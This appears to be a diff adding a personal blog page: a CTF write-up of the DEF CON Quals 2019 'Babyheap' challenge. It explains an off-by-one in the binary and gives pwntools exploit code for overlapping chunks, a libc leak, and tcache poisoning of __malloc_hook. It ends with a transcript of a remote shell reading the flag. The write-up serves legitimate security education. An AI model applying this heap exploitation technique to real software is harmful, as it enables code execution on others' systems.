@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en-id">
+    <head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+		<title>DEF CON Qual 2019 - Babyheap &middot; Kyra&#39;s Note</title>
+
+		
+  		<link rel="stylesheet" href="/css/style.css">
+		<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+		
+		<link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+		<link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+		<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+		
+		<link href="" rel="alternate" type="application/rss+xml" title="Kyra&#39;s Note" />
+	</head>
+
+    <body>
+        		<nav class="nav">
+			<div class="nav-container">
+				<a href="/">
+					<h2 class="nav-title">Kyra&#39;s Note</h2>
+				</a>
+				<ul>
+    <li><a href="/about">About</a></li>
+    <li><a href="/">Posts</a></li>
+</ul>
+			</div>
+		</nav>
+
+        
+
+<main>
+	<div class="post">
+		<div class="post-info">
+    <span>Written by</span>
+        circleous
+        <br>
+        <span>on&nbsp;</span><time datetime="2019-05-14 11:50:23 &#43;0700 WIB">May 14, 2019</time>
+</div>
+		<h1 class="post-title">DEF CON Qual 2019 - Babyheap</h1>
+<div class="post-line"></div>
+
+		
+
+		<h2 id="desc">desc</h2>
+
+<pre><code>babyheap.quals2019.oooverflow.io 5000
+</code></pre>
+
+<h2 id="intro">intro</h2>
+
+<p>So, we get a heap pwn running with glibc 2.29 :0. Yes, this version of glibc already has the juicy tcache and introduce some mitigation (no simple double free, etc.).</p>
+
+<p>Running this binary,</p>
+
+<pre><code>-----Yet Another Babyheap!-----
+[M]alloc
+[F]ree
+[S]how
+[E]xit
+------------------------
+Command:
+&gt;
+</code></pre>
+
+<ol>
+<li><code>[M]alloc</code>, basically create chunk with 2 type of size 0xF8 and 0x178. Any size lower than that are set to the higher bound. So, for example, if you try to create chunk with size of 1, you&rsquo;ll get <code>malloc(0xF8)</code> and chunk size of 0xF9 you&rsquo;ll get <code>malloc(0x178)</code>.</li>
+<li><code>[F]ree</code>, <code>memset(content, 0, chunk_request_size)</code> then <code>free()</code>, pointer also get NULLed at the end. So, no UaF i guess?</li>
+<li><code>[S]how</code>, print the content of chunk.</li>
+<li><code>[E]xit</code>, exit, ofc.</li>
+</ol>
+
+<h2 id="off-by-one">off-by-one</h2>
+
+<p>In <code>[M]alloc</code>, user input to fill content handled like this,
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">read(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">1</span>);
+pos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+<span style="color:#66d9ef">while</span> (buf <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">&amp;&amp;</span> buf) {
+  (<span style="color:#f92672">*</span>content)[pos] <span style="color:#f92672">=</span> buf;
+  read(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">1</span>);
+<span style="display:block;width:100%;background-color:#3c3d38">  <span style="color:#66d9ef">if</span> (chunk_request_size <span style="color:#f92672">==</span> pos<span style="color:#f92672">++</span>)
+</span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}</code></pre></div>
+see it? user input terminated when pos reached <code>chunk_request_size</code>, instead of <code>chunk_request_size-1</code>. This is clearly off-by-one.</p>
+
+<h2 id="attack">attack</h2>
+
+<p>We already have off-by-one in creating chunk, we can create an overlapping chunk with overwriting next chunk metadata. Then, use it to corrupt the tcache free list in overlapping chunks. Before all of that, we need to find libc leak, How?
+Lets start it with initialize the chunks we need.
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    malloc(<span style="color:#ae81ff">0x178</span>, <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x178</span>)
+    malloc(<span style="color:#ae81ff">0xf8</span>, <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0xf8</span>)
+    malloc(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
+    malloc(<span style="color:#ae81ff">0x178</span>, <span style="color:#e6db74">&#39;3&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x178</span>)
+    malloc(<span style="color:#ae81ff">0x178</span>, <span style="color:#e6db74">&#39;4&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x178</span>)
+    malloc(<span style="color:#ae81ff">0xF8</span>, <span style="color:#e6db74">&#39;5&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0xF8</span>)
+    malloc(<span style="color:#ae81ff">0x178</span>, <span style="color:#e6db74">&#39;6&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x178</span>)
+    malloc(<span style="color:#ae81ff">0x178</span>, <span style="color:#e6db74">&#39;7&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x178</span>)
+    malloc(<span style="color:#ae81ff">0x178</span>, <span style="color:#e6db74">&#39;8&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x178</span>)</code></pre></div>
+The idea is to corrupt chunk metadata (chunk size) to something larger than tcache could handle, for that we need to create overlapping chunk first.
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    <span style="color:#75715e"># setup overlapping chunk</span>
+    free(<span style="color:#ae81ff">0</span>)
+    <span style="color:#75715e"># overwrite metadata of chunk 1</span>
+    malloc(<span style="color:#ae81ff">0x178</span>, <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x178</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x81</span><span style="color:#e6db74">&#39;</span>)</code></pre></div>
+Since we have overwritten the size of chunk 1, if we free this chunk, instead of going to <code>tcache[0x100]</code> it&rsquo;ll go to <code>tcache[0x180]</code>. Because of that, if we create another request for <code>malloc(0x178)</code>, it&rsquo;ll go directly to chunk 1 where the size should be 0x100 and overlapping with chunk 2. The content of chunk 1 can directly overwrite chunk 2, thus we will make chunk 2 size large enough and still pointing to a &ldquo;valid&rdquo; chunk.
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    free(<span style="color:#ae81ff">1</span>)
+    <span style="color:#75715e"># now chunk 1 and 2 are overlapping (after another</span>
+    <span style="color:#75715e"># malloc(0x178) request) since we want a libc leak,</span>
+    <span style="color:#75715e"># we need something large enough to pass tcache (&gt; 0x500)</span>
+    <span style="color:#75715e"># and also the size need to point another chunk to</span>
+    <span style="color:#75715e"># pass some check, here I set the size to 0x681.</span>
+    malloc(<span style="color:#ae81ff">0x178</span>, <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0xf8</span> <span style="color:#f92672">+</span> p16(<span style="color:#ae81ff">0x681</span>))</code></pre></div>
+Now, when chunk 2 gets freed, instead going to tcache bins, It&rsquo;ll go to unsorted bins and get the fd bk populated (libc leak here). Also, remember that <code>[F]ree</code> clears the content for <code>chunk_request_size</code>? This is why I created chunk 2 with size of 1 (<code>malloc(1, '2'</code>), instead of the whole content get cleared, it&rsquo;ll only clear the first byte of content/chunk.
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    <span style="color:#75715e"># Instead of goind to tcache bin free list, chunk2</span>
+    <span style="color:#75715e"># will goes to unsorted bin and we will get a nice</span>
+    <span style="color:#75715e"># libc leak</span>
+    free(<span style="color:#ae81ff">2</span>)
+    malloc(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;A&#39;</span>)
+
+    leak <span style="color:#f92672">=</span> show(<span style="color:#ae81ff">2</span>)
+    leak <span style="color:#f92672">=</span> u64(leak<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+
+    <span style="color:#75715e"># main_arena trick</span>
+    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> (leak <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__malloc_hook&#39;</span>]) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFFFFFFF000</span>
+
+    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;LIBC&#39;</span>, hex(libc<span style="color:#f92672">.</span>address)</code></pre></div>
+After this we only need to do tcache poisoning, with creating another overlapping chunks first,
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    <span style="color:#75715e"># setting up another overlapping chunks</span>
+    free(<span style="color:#ae81ff">4</span>)
+    malloc(<span style="color:#ae81ff">0x178</span>, <span style="color:#e6db74">&#39;4&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x178</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x81</span><span style="color:#e6db74">&#39;</span>)
+    free(<span style="color:#ae81ff">6</span>)
+    free(<span style="color:#ae81ff">5</span>)</code></pre></div>
+then, do the tcache poisoning,
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    <span style="color:#75715e"># tcache poisoning</span>
+    malloc(<span style="color:#ae81ff">0x178</span>, <span style="color:#e6db74">&#39;5&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x100</span> <span style="color:#f92672">+</span> 
+    	p64(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__malloc_hook&#39;</span>])<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>))
+    malloc(<span style="color:#ae81ff">0x178</span>, <span style="color:#e6db74">&#39;a&#39;</span>)
+
+    <span style="color:#75715e"># overwrite __malloc_hook with one_gadge</span>
+    malloc(<span style="color:#ae81ff">0x178</span>, 
+    	p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x106ef8</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>))
+    free(<span style="color:#ae81ff">8</span>)</code></pre></div>
+profit
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;M&#39;</span>) <span style="color:#75715e"># trigger malloc</span>
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>) <span style="color:#75715e"># trigger malloc</span></code></pre></div></p>
+
+<h2 id="flaggg">flaggg</h2>
+
+<pre><code>λ › REMOTE=1 python2 solve.py
+[+] Opening connection to babyheap.quals2019.oooverflow.io on port 5000: Done
+LIBC 0x7f51a413b000
+[*] Switching to interactive mode
+$ id
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+$ cat /flag
+OOO{4_b4byh34p_h45_nOOO_n4m3}
+$
+[*] Interrupted
+[*] Closed connection to babyheap.quals2019.oooverflow.io port 5000
+</code></pre>
+
+		
+	</div>
+
+	<div class="pagination">
+		<a href="/posts/a-long-rant-and-fbctf-2019-kpets/" class="right arrow">&#8594;</a>
+
+		<a href="#" class="top">Top</a>
+	</div>
+</main>
+
+
+        		<footer>
+			<span>
+			&copy; <time datetime="2019-08-25 14:36:12.370704073 &#43;0700 WIB m=&#43;0.089774532">2019</time> . Made with <a href='https://gohugo.io'>Hugo</a> using the <a href='https://github.com/EmielH/tale-hugo/'>Tale</a> theme.
+			</span>
+		</footer>
+
+    </body>
+</html>
